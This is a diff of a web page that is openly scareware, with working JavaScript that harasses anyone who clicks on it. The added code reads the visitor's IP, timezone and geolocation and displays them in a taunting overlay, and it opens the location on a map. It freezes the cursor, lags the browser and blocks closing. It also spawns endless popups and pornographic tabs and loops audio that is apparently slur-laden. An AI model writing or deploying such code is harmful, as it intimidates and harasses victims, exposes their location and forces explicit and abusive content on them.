@@ -18,15 +18,6 @@
             color: white;
             font-family: Arial, sans-serif;
         }
-        #user-info {
-            text-align: center;
-            max-width: 80%;
-            margin: 20px;
-            padding: 20px;
-            background: rgba(0, 0, 0, 0.5);
-            border-radius: 10px;
-            font-size: 18px;
-        }
         #cursor-freeze {
             position: absolute;
             top: 50%;
@@ -46,20 +37,53 @@
             color: red;
             z-index: 1000;
         }
-        .gif-popup {
+        .popup {
             position: absolute;
-            width: 200px;
-            height: 200px;
+            width: 300px;
+            height: 300px;
+            background: rgba(0, 0, 0, 0.8);
+            color: white;
+            text-align: center;
+            padding: 20px;
+            border: 2px solid red;
+            box-shadow: 0 0 20px red;
+            z-index: 1000;
+            font-size: 18px;
+        }
+        .popup img {
+            max-width: 100%;
+            max-height: 100%;
+        }
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            color: red;
+            font-size: 24px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 2000;
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0% { color: red; }
+            50% { color: darkred; }
+            100% { color: red; }
         }
     </style>
 </head>
 <body>
     <div id="click-to-load">Click anywhere to load the page</div>
     <div id="cursor-freeze"></div>
-    <div id="user-info" style="display: none;"></div>
+    <div id="overlay" class="overlay" style="display: none;"></div>
 
-    <audio id="audioElement1" src="https://flying-scarlet-do7efylbnn.edgeone.app/Daniel%20Beenards%20Last%20Words%20(SAD).mp3" loop></audio>
-    <audio id="audioElement2" src="https://tender-amaranth-spwxfkezc4.edgeone.app/_NGR%20NGR%20NGR.mp3" loop></audio>
+    <audio id="audioElement1" src="https://github.com/gtatacotruck/Silver-toes-scareware/raw/41ed47b5d70ce74ff64b68274868a33101318a39/_NGR%20NGR%20NGR.mp3" loop></audio>
+    <audio id="audioElement2" src="https://github.com/gtatacotruck/Silver-toes-scareware/raw/41ed47b5d70ce74ff64b68274868a33101318a39/Daniel%20Beenards%20Last%20Words%20(SAD).mp3" loop></audio>
     <audio id="audioElement3" src="https://github.com/gtatacotruck/Silver-toes-scareware/raw/09a916a1cdf93224dcd83ff48e4452ab6225ee71/NWORDSPAM.mp3" loop></audio>
 
     <script>
@@ -69,73 +93,25 @@
             return data.ip;
         }
 
-        function getUserAgent() {
-            return navigator.userAgent;
+        function getUserState() {
+            return Intl.DateTimeFormat().resolvedOptions().timeZone;
         }
 
-        function getScreenResolution() {
-            return `${window.screen.width} x ${window.screen.height}`;
-        }
-
-        function getDeviceMemory() {
-            return navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown';
-        }
-
-        function getBatteryStatus() {
-            if (navigator.getBattery) {
-                return navigator.getBattery().then(battery => {
-                    return `Charge: ${battery.charging ? 'Charging' : 'Discharging'}, Level: ${battery.level * 100}%`;
-                });
-            } else {
-                return Promise.resolve('Battery status not available');
-            }
-        }
-
-        function getTimezone() {
-            return new Date().toLocaleString('en-US', { timeZoneName: 'short' });
-        }
-
-        function getLanguage() {
-            return navigator.language;
-        }
-
-        function getPlatform() {
-            return navigator.platform;
-        }
-
-        function getCookiesEnabled() {
-            return navigator.cookieEnabled ? 'Enabled' : 'Disabled';
-        }
-
-        function getOnlineStatus() {
-            return navigator.onLine ? 'Online' : 'Offline';
-        }
-
-        function getUserInfo() {
-            return Promise.all([
-                fetchIP(),
-                getUserAgent(),
-                getScreenResolution(),
-                getDeviceMemory(),
-                getBatteryStatus(),
-                getTimezone(),
-                getLanguage(),
-                getPlatform(),
-                getCookiesEnabled(),
-                getOnlineStatus()
-            ]).then(([ip, userAgent, resolution, memory, battery, timezone, language, platform, cookies, online]) => {
-                return `
-                    <p>IP Address: ${ip}</p>
-                    <p>User Agent: ${userAgent}</p>
-                    <p>Screen Resolution: ${resolution}</p>
-                    <p>Device Memory: ${memory}</p>
-                    <p>Battery Status: ${battery}</p>
-                    <p>Timezone: ${timezone}</p>
-                    <p>Language: ${language}</p>
-                    <p>Platform: ${platform}</p>
-                    <p>Cookies: ${cookies}</p>
-                    <p>Online Status: ${online}</p>
-                `;
+        function getUserLocation() {
+            return new Promise((resolve, reject) => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            const { latitude, longitude } = position.coords;
+                            resolve({ latitude, longitude });
+                        },
+                        (error) => {
+                            reject(error);
+                        }
+                    );
+                } else {
+                    reject('Geolocation is not supported by this browser.');
+                }
             });
         }
 
@@ -173,7 +149,8 @@
             for (let i = 0; i < numTabs; i++) {
                 setTimeout(() => {
                     const url = `https://www.pornhub.com`;
-                    window.open(url, '_blank');
+                    const newTab = window.open(url, '_blank');
+                    newTab.document.title = 'GET THUGGED';
                 }, i * interval);
             }
         }
@@ -224,40 +201,62 @@
 
             setInterval(() => {
                 window.open('', '_blank', 'width=400,height=300');
-                window.open('https://www.pornhub.com', '_blank');
+                const newTab = window.open('https://www.pornhub.com', '_blank');
+                newTab.document.title = 'GET THUGGED';
             }, 1000);
         }
 
-        function popUpGifs() {
+        function popUpGifsAndImages() {
             const gifUrls = [
                 'https://github.com/gtatacotruck/Silver-toes-scareware/raw/a74e36b74168bae104be775c56ca79aa480122a3/Smd.gif',
                 'https://github.com/gtatacotruck/Silver-toes-scareware/raw/a74e36b74168bae104be775c56ca79aa480122a3/Mb%20bro.gif',
                 'https://github.com/gtatacotruck/Silver-toes-scareware/raw/a74e36b74168bae104be775c56ca79aa480122a3/How%20KOC%20made%20Ts.gif',
                 'https://github.com/gtatacotruck/Silver-toes-scareware/raw/a74e36b74168bae104be775c56ca79aa480122a3/Get.gif'
             ];
-            const numGifs = 50; // Number of GIFs to pop up
-            const interval = 100; // Interval between GIF appearances in milliseconds
+            const imageUrls = [
+                'https://github.com/gtatacotruck/Silver-toes-scareware/raw/5427070e08ca735fd0a73582f15733e524b964ae/IMG_1017.png',
+                'https://github.com/gtatacotruck/Silver-toes-scareware/raw/5427070e08ca735fd0a73582f15733e524b964ae/IMG_1016.png',
+                'https://github.com/gtatacotruck/Silver-toes-scareware/raw/5427070e08ca735fd0a73582f15733e524b964ae/IMG_0950.jpeg',
+                'https://github.com/gtatacotruck/Silver-toes-scareware/raw/5427070e08ca735fd0a73582f15733e524b964ae/IMG_0949.jpeg',
+                'https://github.com/gtatacotruck/Silver-toes-scareware/raw/5427070e08ca735fd0a73582f15733e524b964ae/IMG_0704.jpeg'
+            ];
+            const numElements = 50; // Number of elements to pop up
+            const interval = 500; // Increased interval between element appearances in milliseconds
 
-            for (let i = 0; i < numGifs; i++) {
+            for (let i = 0; i < numElements; i++) {
                 setTimeout(() => {
-                    const img = document.createElement('img');
-                    img.className = 'gif-popup';
-                    img.src = gifUrls[Math.floor(Math.random() * gifUrls.length)];
-                    img.style.top = `${Math.random() * 100}%`;
-                    img.style.left = `${Math.random() * 100}%`;
-                    document.body.appendChild(img);
+                    const popup = document.createElement('div');
+                    popup.className = 'popup';
+                    popup.style.top = `${Math.random() * 100}%`;
+                    popup.style.left = `${Math.random() * 100}%`;
+                    popup.innerHTML = `<img src="${i % 2 === 0 ? gifUrls[Math.floor(Math.random() * gifUrls.length)] : imageUrls[Math.floor(Math.random() * imageUrls.length)]}" alt="Popup Image"><br>GET THUGGED`;
+                    document.body.appendChild(popup);
                 }, i * interval);
             }
         }
 
-        document.addEventListener('click', () => {
+        function showLocationOnMap(latitude, longitude) {
+            const mapUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
+            window.open(mapUrl, '_blank', 'width=800,height=600');
+        }
+
+        document.addEventListener('click', async () => {
             const clickToLoad = document.getElementById('click-to-load');
             clickToLoad.style.display = 'none';
 
-            getUserInfo().then(info => {
-                document.getElementById('user-info').innerHTML = info;
-                document.getElementById('user-info').style.display = 'block';
-            });
+            const userIP = await fetchIP();
+            const userState = getUserState();
+
+            const overlay = document.getElementById('overlay');
+            overlay.innerHTML = `IMAGING LIVING IN ${userState}<br>LOL UR IP IS ${userIP}`;
+            overlay.style.display = 'block';
+
+            try {
+                const location = await getUserLocation();
+                showLocationOnMap(location.latitude, location.longitude);
+            } catch (error) {
+                console.error('Error getting location:', error);
+            }
 
             freezeCursor();
             lagBrowser();
@@ -265,7 +264,7 @@
             openPopupsAndTabs();
             makeBrowserBuggy();
             preventClose();
-            popUpGifs();
+            popUpGifsAndImages();
         });
     </script>
 </body>
